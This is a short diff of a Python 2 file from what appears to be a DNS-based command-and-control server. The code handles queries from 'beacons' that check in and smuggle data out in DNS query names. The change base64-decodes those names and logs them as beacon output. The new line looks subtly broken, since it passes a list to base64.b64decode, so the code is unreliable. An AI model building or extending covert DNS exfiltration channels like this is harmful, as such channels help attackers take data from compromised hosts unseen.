@@ -2,7 +2,7 @@
     File containing classes and functions to handle a DNS Query
     @author Dosh, JRoc
 """
-import struct, sqlite3
+import struct, sqlite3, base64
 import answer
 """
     Class to represent a DNS query
@@ -123,7 +123,8 @@ def handle_query(query, addr, server):
         if x.ip == addr[0]:
             found = True
             if q.names[0][0] != "doshcloud" and q.names[0][0] != "check":
-                x.output += [q.names[0][0]] # add the info the beacon sent back
+                #x.output += [q.names[0][0]] # add the info the beacon sent back
+                server.log('beacon', x, "OUTPUT" + base64.b64decode([q.names[0][0]]))
             elif q.checkin:
                 print "Beacon %d checking in" % (x.tag)
                 server.log('beacon', x, "Beacon %d checking in" % x.tag)
